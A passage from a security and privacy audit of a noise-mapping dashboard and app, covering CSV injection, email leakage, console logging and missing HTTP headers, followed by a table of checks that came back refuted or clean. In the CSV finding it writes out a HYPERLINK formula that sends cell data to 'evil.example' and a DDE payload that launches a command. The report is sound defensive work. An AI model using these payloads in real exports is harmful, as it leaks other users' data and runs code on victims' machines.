- `src/utils/exportHelpers.ts:66`: `const locationName = (reading.locationName || '').replace(/"/g, '""');`
- `src/utils/exportHelpers.ts:71-72`: `lat,` / `lng,`
- `src/utils/exportHelpers.ts:74-75`: `` `"${reading.soundCategory || reading.soundClass || 'Unknown'}"`, `` / `` `"${reading.soundType || 'Unknown'}"`, ``
- `src/utils/exportHelpers.ts:77`: `` `"${userMap?.get(reading.userId)?.email || reading.userId || 'Unknown'}"` ``
- `src/utils/exportHelpers.ts:84-86`: `// Add BOM for Excel UTF-8 compatibility` / `const BOM = '﻿';`

**Impact:** Any registrant can create a reading whose `locationName` is `=HYPERLINK("https://evil.example/?d="&B2&C2,"Open")`, or whose `soundClass` contains `x","=cmd|' /C calc'!A0`. When a researcher opens the exported CSV in a spreadsheet, the cell is evaluated as a formula. It can carry neighbouring cells (other users' coordinates) out through a link, and DDE runs where it is still enabled. An unescaped quote in `soundClass` shifts columns and silently corrupts the dataset.

**Recommendation:**
- Add one `csvCell(v)` helper and apply it to every column, numbers included. It should stringify the value, prefix `'` when the value starts with `=`, `+`, `-`, `@`, tab or CR, double any `"`, and wrap the result in quotes.
- Validate numbers with `Number.isFinite` before `toFixed`.
- `sec-1`'s rules validation and normalisation reduce the attack surface, but the encoder must not depend on them.

---

### Low

#### [priv-6] App offline-sync path falls back to the raw auth email for legacy queued readings, which then land unmasked in every dashboard IndexedDB

**Severity:** Low | **Category:** privacy | **Repo:** app (cross-repo) | **Reported by:** data

**Status:** unverified (not individually re-checked). Writer cross-check: legacy Hive entries with no `userId` are **not** skipped by the owner filter at `sync_service.dart:235-243`, because `offline_recording.dart:68-69` recovers the uid from the legacy id (`map['userId'] as String? ?? _userIdFromLegacyId(map['id'] as String?)`). Both fields were added in `dc5f05d`, so the null-`userEmail` fallback is reachable for pre-`dc5f05d` entries. The security agent classed this as the mobile playbook's accepted residual (4.2). That residual (`11_FIX_IMPLEMENTATION_PLAYBOOK.md:253-254`) names only entries "written between 02 and 04", which hold a raw email directly. It does not name the pre-02 null case that falls through to the raw fallback. The mobile audit is closed; this is listed because the dashboard caches the result.

**Location:** `noise_pollution_mapper/lib/services/sync_service.dart:308` (app)

**Description:** Current builds always queue a non-null masked label (`firebase_service.dart:212-215`), and `authorLabel` never returns null; its minimum is `'Anonymous'` (`:33`). A device that still holds a queue entry from before 2026-09-07 uploads it with `_auth.currentUser?.email`, the owner's raw address. Dead-lettered entries are revived on every reconnect (`sync_service.dart:115`). The doc lands in world-readable `noise_readings`. On the dashboard it is cached at rest in IndexedDB but never displayed or exported, since `src` never references `userEmail`. Production shows 0 raw-looking values today (probe).

**Evidence:**
- `lib/services/sync_service.dart:308`: `'userEmail': recording.userEmail ?? _auth.currentUser?.email,`
- `lib/services/firebase_service.dart:212-215`: `userEmail: authorLabel(` / `displayName: _auth.currentUser?.displayName,` / `email: _auth.currentUser?.email,` / `),`
- `lib/models/offline_recording.dart:70`: `userEmail: map['userEmail'] as String?,`
- `lib/services/sync_service.dart:115`: `await _storage.resetFailedSyncAttempts(maxSyncAttempts);`
- `audit/11_FIX_IMPLEMENTATION_PLAYBOOK.md:253-254`: `Accepted residual: legacy queue` / `entries written between 02 and 04 keep a raw email in Hive and sync it once`

**Impact:** At most the device owner's own address, uploaded once per legacy entry. It becomes readable by every signed-in user through the SDK, and is cached at rest in every dashboard browser. The browser cache is never refreshed (`priv-1`), so the value outlives any later Firestore fix.

**Recommendation:** One-line app change with no migration: `recording.userEmail ?? FirebaseService.authorLabel(displayName: _auth.currentUser?.displayName, email: _auth.currentUser?.email)`. On the dashboard side, the field whitelist recommended in `priv-1` removes `userEmail` from the cache entirely.

---

#### [priv-5] NoiseMarkers logs full reading objects with author label and GPS to the browser console on every filter recompute

**Severity:** Low | **Category:** privacy | **Repo:** dashboard | **Reported by:** security

**Status:** unverified (not individually re-checked). Writer note: the log fires only for readings that fail the location check at `NoiseMarkers.tsx:124-141`. All 3,374 production docs have numeric `latitude`/`longitude` (probe), so it does not fire on today's data. It is latent until a malformed or legacy doc appears.

**Location:** `src/components/map/NoiseMarkers.tsx:145` (dashboard)

**Description:** `filteredReadings` is recomputed on every render, not memoised. For each reading without a valid location it dumps the whole cached document to the console: `userId`, the `userEmail` label (raw in pre-2026-09-09 caches), and whatever coordinates it does carry.

**Evidence:** `src/components/map/NoiseMarkers.tsx:144-146`: `if (!isValidLocation) {` / `console.warn('Invalid location data for reading:', reading.id, reading);` / `return false;`

**Impact:** Console output ends up in screenshots, shared DevTools logs, or a future error-reporting integration, carrying other users' identifiers. It is also noisy, repeating on every recompute.

**Recommendation:** Log `reading.id` only, or drop invalid docs once in the `normalizeReading()` step proposed in `sec-1`.

---

#### [sec-5] vercel.json sets no security headers (CSP, frame-ancestors, nosniff) and its catch-all rewrite serves index.html for missing assets

**Severity:** Low | **Category:** security | **Repo:** dashboard | **Reported by:** security, build

**Status:** unverified (not individually re-checked). The headers actually served by the live Vercel deployment are open: production check P12 in `03`, section 5.

**Location:** `vercel.json:13` (dashboard)

**Description:** The only header rule caches `/assets/*` immutably. There is no Content-Security-Policy, `frame-ancestors`/`X-Frame-Options`, `X-Content-Type-Options` or `Referrer-Policy`, and `index.html` has no meta CSP. The catch-all rewrite sends a missing `/assets/...` request to `index.html`. Static files take precedence on Vercel, so this affects only genuinely missing assets. The Firebase Auth session (refresh token) lives in browser storage.

**Evidence:**
- `vercel.json:7-12`: `"rewrites": [` / `{` / `"source": "/(.*)",` / `"destination": "/index.html"`
- `vercel.json:13-21`: `"headers": [` / `{` / `"source": "/assets/(.*)",` / ... / `"value": "public, max-age=31536000, immutable"`
- `index.html:3-8`: the head holds only charset, icon, viewport and title.

**Impact:** The dashboard can be framed on another origin, which enables clickjacking of the login form or of the 'Fetch All Readings' confirm. There is no CSP backstop if an HTML sink is ever added. None exists today (see the stored-XSS check below).

**Recommendation:**
- Add a `"source": "/(.*)"` header block with:
  - a CSP limited to `'self'`, the OSM tile host, `firestore.googleapis.com`, `identitytoolkit.googleapis.com` and `securetoken.googleapis.com`, the auth domain in `frame-src`, and `frame-ancestors 'none'`;
  - `X-Content-Type-Options: nosniff`;
  - `Referrer-Policy: strict-origin-when-cross-origin`.
- Exclude `/assets/` from the rewrite.

---

### Enhancement

None in this area.

## Checked and refuted, or checked and clean (no finding)

These were checked explicitly by the auditors. They are listed so they are not re-audited, and are excluded from recommendations.

| Check | Result | Basis |
|-------|--------|-------|
| Stored XSS from Firestore fields (popups, tooltips, cluster icons, chart labels) | **REFUTED** | A grep for `bindPopup`, `bindTooltip`, `divIcon`, `innerHTML`, `insertAdjacentHTML`, `dangerouslySetInnerHTML` hits only `components/ui/chart.tsx:81` (ChartStyle). Its `ChartContainer` is imported nowhere and its input is static config. Popups are react-leaflet `<Popup>` with JSX children (`NoiseMarkers.tsx:312-370`), so they are escaped. Marker icons use internal colour constants, and the cluster icon interpolates only a numeric count. Hostile fields cause a crash (`sec-1`) or CSV injection (`sec-2`), not script execution. |
| Raw `userEmail` displayed or exported by the dashboard | **REFUTED** | `userEmail` appears nowhere in `src` (grep) and is absent from `types/NoiseReading.ts:3-26`. The CSV and JSON columns are fixed lists (`exportHelpers.ts:68-78`, `:109-126`). Raw values exist only at rest in IndexedDB (`priv-1`, `priv-4`). |
| `/analytics` "silently dead" (handoff item 1a) | **REFUTED** | See `03`, section 1.2. The page renders. Only the user column degrades (`priv-2`). |
| Deployed rules drift from source | Clean | Owner probe 2026-10-16: deployed ruleset `ebff82af-152c-4626-a996-3e4e9f026a2c` equals both checked-in copies. The writer re-diffed `deployed_firestore.rules` against the dashboard copy and found it identical after CRLF and trailing-space normalisation. |
| `serviceAccountKey.json`, `.env`, `cache/` ever committed | Clean | `.gitignore:16,53,59`. `git log --all` is empty for `serviceAccountKey.json` and `.env`. The key file's contents were not opened. |
| Server-only code or secrets in the browser bundle | Clean | `bundle.txt`: "no server-only markers found in built JS" (single 1,422,665-byte chunk). |
| Web API key versus the pending `SECURITY_ROTATION.md` | Clean | The dashboard uses the app's web key (hash-matched with the `firebase_options` web entry and the dist bundle). The rotation restricts only the Android/iOS keys, so it will not break the dashboard. |
| Hardcoded or demo credentials in `LoginPage` | Clean | Only the `admin@noisemapper.lk` mailto (`LoginPage.tsx:259`). There is no sign-up UI, but project-wide email/password sign-up is open (`sec-4`). |
| `functions/lib` stale versus `functions/src` (masking regression) | Clean | The compiled output carries the `d1fb172` masking. The `makePublic()` calls are present in both (`functions/lib/cache-export.js:137,182`), see `priv-3`. |
| Browser writes to Firestore | None | No `setDoc`, `addDoc`, `updateDoc`, `deleteDoc`, `writeBatch` or `runTransaction` in `src` (grep). The browser is read-only, as the rules header states. |
| Static checks | Clean | `tsc.log` is empty. `eslint.log` has 1 warning (unused disable directive, `CacheStatus.tsx:57`), unrelated to security. `CHECKS_DONE` is present. |

## Related findings in other documents

| ID | Severity | Why it matters here |
|----|----------|---------------------|
| data-1 | High | Same delta-sync root cause as `priv-1`: back-dated offline uploads are never fetched (`03`). |
| bug-1 | High | The IndexedDB round-trip strips `Timestamp.toDate()`, so every export row's timestamp is 'Unknown'. The `normalizeReading()` step in `sec-1` fixes both. |
| perf-1 | High | The full-collection `onSnapshot` at `DashboardPage.tsx:33` is the natural base for the `priv-1` long-term fix. |
| arch-2 | Low | The dead Storage pipeline of which `priv-3`'s function is a part. |
| build-1 / build-2 | Low | Stale rulesets in deploy guides, and the app's `firebase.json` storage target. Deploy hygiene for every rules fix here. |
| test-1 | Medium | No test or CI guard against the two `firestore.rules` copies drifting. Every rules change in `sec-1`/`sec-3`/`priv-2` must be applied to both. |
| ux-7 / ux-8 | Low | "secure" wording, 'Request access' implying gating, and 'Remember me' writing without reading (copy side of `sec-4`/`priv-4`). |
